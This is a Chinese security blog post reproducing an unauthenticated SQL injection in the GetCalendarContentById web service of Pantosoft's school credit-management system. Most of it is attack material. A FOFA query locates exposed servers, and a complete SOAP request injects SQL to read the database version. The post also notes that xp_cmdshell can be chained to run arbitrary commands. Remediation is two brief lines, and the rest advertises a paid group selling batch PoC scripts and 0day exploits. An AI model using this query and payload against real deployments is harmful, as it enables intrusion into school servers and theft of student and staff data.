#  「漏洞复现」学分制系统 GetCalendarContentById SQL注入漏洞   
冷漠安全  冷漠安全   2024-06-22 19:38  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
学分制系统由上海鹏达计算机系统开发有限公司研发，是基于对职业教育特点和需求的深入理解，结合教育部相关文件精神，并广泛吸纳专家、学者意见而开发的一款综合性管理系统。系统采用模块化的设计方法，方便学校根据自身教学改革特点、信息化建设进程情况选择、组合适应自身特点的管理软件。系统包含学籍管理、师资管理、教学计划管理、排课管理、选课管理、考试管理、成绩管理、实践教学管理、教学质量评价等功能模块，能够全面满足学校的教育管理需求。  
  
0x03  
  
**漏洞威胁**  
  
学分制系统 GetCalendarContentById 实例处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0riatM6Uvst6CS7ibe7Dn5cOiaKcS1kQBvPN88Pr9IMZiarpFaibwuvzjap2iac50JbSX28Xw3yNX4UE71w/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
POC  
```
POST /WebService_PantoSchool.asmx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Content-Type: text/xml; charset=utf-8
Connection: close
 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
  <soapenv:Header/>
    <soapenv:Body>
      <tem:GetCalendarContentById>
        <!--type: string-->
        <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>
      </tem:GetCalendarContentById>
    </soapenv:Body>
</soapenv:Envelope>
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0riatM6Uvst6CS7ibe7Dn5cOiaFiaHMae8B4XNaklG5fVgBicdCFBYk7uo6iczP3ibkzhiag0QtfKIzcjKy0w/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0riatM6Uvst6CS7ibe7Dn5cOia5NWrYN1m0TH5AjMCNg0V6zQQgHf769vcjCaMcn2889yGdCYZ0qgnpQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0riatM6Uvst6CS7ibe7Dn5cOiab3fqpz6gKCuiaOYw3tcaCRTUWEyYhWnlaqFHXB1LicWLLtAQvDB96vicg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0riatM6Uvst6CS7ibe7Dn5cOiauEPnN29S0jkT1tiaB1zWEiaOAZ8nEyTudSbLwFQ2ACicpn0tAAEbBVksw/640?wx_fmt=gif&from=appmsg "")  
  
  
